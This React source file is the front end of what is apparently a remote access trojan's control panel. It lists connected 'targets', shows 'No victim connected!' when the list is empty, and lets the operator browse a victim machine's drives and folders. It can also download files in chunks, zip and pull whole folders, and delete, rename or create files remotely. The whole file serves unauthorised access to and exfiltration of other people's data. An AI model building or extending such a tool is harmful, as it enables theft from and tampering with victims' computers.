import React, { Component } from 'react'
import './App.css'
import { ArrowLeftCircle, ArrowUpCircleSolid, FolderPlus, HardDrive, PagePlus, RefreshCircle } from 'iconoir-react'
import { io } from 'socket.io-client';
import FolderRow from './components/FolderRow';
import FileRow from './components/FileRow';
import ToastMsg from './components/ToastMsg';
import LoadingCircle from './components/LoadingCircle';
import OkayCancleDialog from './components/OkayCancleDialog';
import SingleEntryPrompt from './components/SingleEntryPrompt';
import DownloadingFolderDialog from './components/DownloadingFolderDialog';
import TargetElement from './components/TargetElement';

let file_writer = null;
export default class App extends Component {
  constructor() {
    super();
    this.state = {
      targets_available: [],
      selected_target: null,
      drives: [],
      currentMedias: [],
      cwd: "",
      currentDownloading: null,
      toastMsg: null,
      loadingCircle: null,
      askOkCancleDialog: null,
      entryPromptDialog: null,
      folderDownloadingDialog: null,
    }

    this.file_explores_ws = io("/file_explorer");
    this.file_explores_ws.on("connect", () => {
      console.log("Connected with file explorer");
      this.file_explores_ws.emit("list_targets");
    });

    this.file_explores_ws.on("list_targets", (data_) => {
      this.setState({ targets_available: data_["targets"] });
    })

    this.file_explores_ws.on("response_channel", (data_) => {
      if (data_["type"] === "drive_list") {
        this.setState({ drives: data_["drives"] });
        this.hideLoadingCircle();
        this.file_explores_ws.emit("list_files", { "path": "./" });
      }
      else if (data_["type"] === "media_list") {
        this.setState({ currentMedias: data_["medias"], cwd: data_["cwd"] });
        this.hideLoadingCircle();
      }
      else if (data_["type"] === "file_chunk_resp") {
        file_writer.write(data_["bytes"]);
        if (data_["transmission_end"]) {
          file_writer.close()
          this.setState({ currentDownloading: null });
        }
        else {
          data_["bytes"] = null
          data_["type"] = null
          this.setState({ currentDownloading: data_ });
          this.file_explores_ws.emit("download_file", data_);
        }
      }
      else if (data_["type"] === "zipping_done") {
        this.setState({ folderDownloadingDialog: null });
        this.onDownloadFile(data_["info"]["zip_file_name"]);
      }
      else if (data_["type"] === "zipping_cancelled") {
        this.setState({ folderDownloadingDialog: null });
        this.createToastMsg("Zipping cancelled");
      }
      else if (data_["type"] === "target_selected"){
        this.setState({selected_target: data_["sid"]});
        this.createToastMsg(`Target '${data_["sid"]}' selected`);
        this.onReloadDriveList();
      }
      else if (data_["type"] === "error_msg") {
        this.createToastMsg(`🔴 Error : ${data_["error"]}`);
        this.hideLoadingCircle();
        this.setState({folderDownloadingDialog: null});
      }
      else if (data_["type"] === "success_msg") {
        this.createToastMsg(`🟢 Success : ${data_["msg"]}`);
        this.hideLoadingCircle();
      }
      // console.log(data_)
    });
  }


  createToastMsg = (msg_) => {
    this.setState({ toastMsg: <ToastMsg msg={msg_} /> });
    setTimeout(() => {
      this.setState({ toastMsg: null })
    }, 5000);
  }

  showLoadingCircle = () => {
    this.setState({ loadingCircle: <LoadingCircle /> });
  }
  hideLoadingCircle = () => {
    this.setState({ loadingCircle: null });
  }

  onSelectClient = (sid)=>{
    if (this.state.selected_target === sid){
      this.createToastMsg("This target is already selected!");
      return;
    }
    this.file_explores_ws.emit("select_target", {"sid": sid});
    this.showLoadingCircle();
  }

  onReloadDriveList = () => {
    this.file_explores_ws.emit("list_drives");
  }

  onPreviousDir = () => {
    this.showLoadingCircle();
    this.file_explores_ws.emit("switch_dir", { "path": '..' });
  }

  onChdir = (path) => {
    this.showLoadingCircle();
    this.file_explores_ws.emit("switch_dir", { "path": path });
  }

  fileSizeWithUnit = (size_, decimal_places = 2) => {
    let units_ = ["B", "KB", "MB", "GB", "TB", "PB", "EB"];
    let idx = 0
    while (size_ >= 1024 && idx < units_.length) {
      size_ /= 1024
      idx += 1
    }
    return `${Number(size_).toFixed(decimal_places)} ${units_[idx]}`
  }

  onDownloadFile = (file_name) => {
    window.showSaveFilePicker({
      suggestedName: file_name,
      startIn: "downloads"
    }).then((fp) => {
      fp.createWritable().then((writable) => {
        file_writer = writable.getWriter();
        let download_init_req = { "file_name": file_name, "seg_from": 0, "seg_to": 3000000, "chunk_size": 3000000, "total_chunks": 0, "current_chunk": 0 };
        this.setState({ currentDownloading: download_init_req });
        this.file_explores_ws.emit("download_file", download_init_req);
      });
    }).catch(console.log);
  }

  onChangePathInput = (ele) => {
    this.setState({ cwd: ele.target.value });
  }
  onSendInputPath = (eve) => {
    if (eve.code === "Enter") {
      this.onChdir(this.state.cwd);
    }
  }

  onDelete = (media_name, type) => {
    const on_okay = () => {
      this.setState({ askOkCancleDialog: null });
      this.showLoadingCircle();
      this.file_explores_ws.emit("delete_media", { "media_name": media_name, "type": type });
    }
    const on_cancle = () => {
      this.setState({ askOkCancleDialog: null });
    }
    this.setState({ askOkCancleDialog: <OkayCancleDialog msg={`Would you like to delete '${media_name}' permanently ?`} onCancleFunc={on_cancle} onOkFunc={on_okay} /> });
  }

  onRename = (media_name) => {
    const on_ok = (new_name) => {
      this.setState({ entryPromptDialog: null })
      this.showLoadingCircle();
      this.file_explores_ws.emit("rename_media", { "old_name": media_name, "new_name": new_name });
    }
    const on_cancle = () => {
      this.setState({ entryPromptDialog: null })
    }
    this.setState({ entryPromptDialog: <SingleEntryPrompt msg={`Rename '${media_name}' to`} placeholder="New name here..." onCancleFunc={on_cancle} onOkFunc={on_ok} /> })
  }

  onCreateNewFile = () => {
    const on_ok = (file_name) => {
      this.showLoadingCircle()
      this.file_explores_ws.emit("create_new_file", { "file_name": file_name });
      this.setState({ entryPromptDialog: null })
    }
    const on_cancle = () => {
      this.setState({ entryPromptDialog: null })
    }
    this.setState({ entryPromptDialog: <SingleEntryPrompt msg={`Create new file`} placeholder="File name here..." onCancleFunc={on_cancle} onOkFunc={on_ok} /> })
  }

  onCreateNewFolder = () => {
    const on_ok = (folder_name) => {
      this.showLoadingCircle()
      this.file_explores_ws.emit("create_new_folder", { "folder_name": folder_name });
      this.setState({ entryPromptDialog: null })
    }
    const on_cancle = () => {
      this.setState({ entryPromptDialog: null })
    }
    this.setState({ entryPromptDialog: <SingleEntryPrompt msg={`Create new folder`} placeholder="Folder name here..." onCancleFunc={on_cancle} onOkFunc={on_ok} /> })
  }

  onDownloadFolder = (folder_name) => {
    const on_cancle = () => {
      this.file_explores_ws.emit("cancle_zip_folder");
    }
    this.file_explores_ws.emit("begin_zip_folder", { "folder_name": folder_name })
    this.setState({ folderDownloadingDialog: <DownloadingFolderDialog msg="Preparing Download" on_cancle={on_cancle} key={"download_win1"} /> });
  }

  render() {
    return (
      <div className='file_exp_main_body'>
        {this.state.currentDownloading ?
          <div className='download_progress_win'>
            <div className='progress_ui'>
              <h1 className='win_heading'>Downloading</h1>
              <span className='file_name'>File Name - {this.state.currentDownloading["file_name"]}</span>
              <span className='chunk_info'>{this.state.currentDownloading["current_chunk"]}/{this.state.currentDownloading["total_chunks"]} chunks downloaded</span>
              <progress max={this.state.currentDownloading["total_chunks"]} value={this.state.currentDownloading["current_chunk"]}></progress>
            </div>
          </div> : null}

        {this.state.toastMsg}
        {this.state.loadingCircle}
        {this.state.askOkCancleDialog}
        {this.state.entryPromptDialog}
        {this.state.folderDownloadingDialog}

        <div className='drive_list'>
          <div className='target_list'>
            <p className='targets_title'>Targets</p>
            {this.state.targets_available.length ?
              this.state.targets_available.map((ele, idx) => {
                return (
                  <TargetElement target_data={ele} selected_target={this.state.selected_target} onSelectTarget={() => { this.onSelectClient(ele["sid"]) }} key={"CLIENT_" + idx} />
                )
              })
              : <p className='text_no_victim'>No victim connected!</p>}
          </div>

          <div className='list_of_drives'>
            <RefreshCircle width={40} height={40} color='lightgray' className='reload_drives' onClick={this.onReloadDriveList} />
            {this.state.drives.map((ele, idx) => {
              return (
                <div className='drive_ele' key={"drive_list_element" + idx} onClick={() => { this.onChdir(ele["Name"]) }}>
                  <HardDrive width={50} height={50} color='cyan' className='drive_ico' />
                  <span className='drive_name'>{ele["Name"]}</span>
                  <span className='drive_size'>
                    Free Space : {(Number(ele["FreeSpace"]) / (1e+9)).toFixed(2)} GB
                    <br />
                    Total Size : {(Number(ele["Size"]) / (1e+9)).toFixed(2)} GB
                  </span>
                </div>
              )
            })}
          </div>
        </div>
        <div className='other_content'>
          <div className='top_header'>
            <ArrowLeftCircle width={50} height={50} color='cyan' strokeWidth={2.3} onClick={this.onPreviousDir} />
            <input type="text" className='path_entry' value={this.state.cwd} onChange={this.onChangePathInput} onKeyDown={this.onSendInputPath} />
            <PagePlus width={45} height={45} color='cyan' style={{ marginRight: "5px" }} strokeWidth={2.3} onClick={this.onCreateNewFile} />
            <FolderPlus width={45} height={45} color='cyan' style={{ marginRight: "5px" }} strokeWidth={2.3} onClick={this.onCreateNewFolder} />
          </div>
          <div className='file_folder_list'>
            <span className='previous' onClick={this.onPreviousDir}>
              <ArrowUpCircleSolid width={40} height={40} color='white' />
              ●  ●
            </span>
            <div className='actual_list'>
              <div className='holder'>
                {this.state.currentMedias.map((ele, idx) => {
                  return ele["type"] === "folder" ?
                    <FolderRow folder_name={ele["name"]} no_of_items={ele["items"]} date_of_creation={ele["creation_date"].slice(0, 16)} key={"folder_element_" + idx} changeDirFunc={this.onChdir} onDownloadFolder={this.onDownloadFolder} onDeleteFolder={this.onDelete} onRenameFolder={this.onRename} />
                    :
                    <FileRow file_name={ele["name"]} file_size={ele["size"]} date_of_creation={ele["creation_date"].slice(0, 16)} key={"file_element_" + idx} onDownloadFile={this.onDownloadFile} onDeleteFile={this.onDelete} onRenameFile={this.onRename} fileSizeWithUnit={this.fileSizeWithUnit} />
                })}
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }
}
